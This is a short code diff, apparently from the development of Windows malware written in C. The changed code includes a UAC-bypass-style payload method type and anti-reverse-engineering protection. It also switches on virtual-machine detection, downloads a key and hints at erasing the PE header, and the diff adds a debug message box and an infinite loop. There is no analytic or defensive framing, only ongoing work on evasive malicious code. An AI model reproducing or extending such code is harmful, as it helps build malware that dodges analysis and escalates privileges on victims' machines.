@@ -4,7 +4,7 @@
 PVOID IDownloadKey();
 
 typedef BOOL(*pEDllInit)(PPIB);
-typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ LPWSTR lpszPayload);
+typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
 
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
@@ -23,6 +23,14 @@ INT WINAPI wWinMain(
 		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
 	}
 
+	BOOL bT = IHashCodeSection();
+//	fnErasePeHeader();
+
+	MessageBox(0, L"TEST : 1", 0, 0);
+
+	// Halt Execution (Debugging safety)
+	for (;;);
+
 #ifndef _DEBUG
 	// Protect Process
 	BOOL bRE = fnAntiRE();
@@ -31,7 +39,7 @@ INT WINAPI wWinMain(
 
 	// init con
 	// IOpenConsole();
-	// BOOL bVM = ICheckVmPresent();
+	BOOL bVM = ICheckVmPresent();
 
 	PVOID pWKey = IDownloadKey();
 	if (!pWKey) {
